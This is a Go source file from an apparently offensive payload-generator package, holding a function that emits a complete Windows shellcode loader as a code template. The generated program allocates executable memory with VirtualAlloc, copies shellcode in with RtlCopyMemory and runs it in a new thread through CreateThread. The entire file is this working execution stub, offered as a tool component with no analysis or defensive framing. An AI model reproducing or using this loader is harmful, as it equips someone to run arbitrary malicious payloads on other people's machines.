package loaders

import (
	"fmt"
)

func GetCreateThreadTemplate(targetProcess string) string {
	var _ = targetProcess // unused in this template

	println("\n\n[!] PLEASE NOTE: shellcode will not be injected into new process with this method")
	return fmt.Sprintf(`
package main

import (
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32        = syscall.MustLoadDLL("kernel32.dll")
	ntdll           = syscall.MustLoadDLL("ntdll.dll")

    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	CreateThread        = kernel32.MustFindProc("CreateThread")

    RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
)

func ExecuteOrderSixtySix(shellcode []byte) {

	addr, _, _ := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	_, _, _ = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

    threadAddr, _, _ := CreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)

    WaitForSingleObject.Call(
        threadAddr,
        0xFFFFFFFF,
    )
}
    `)
}
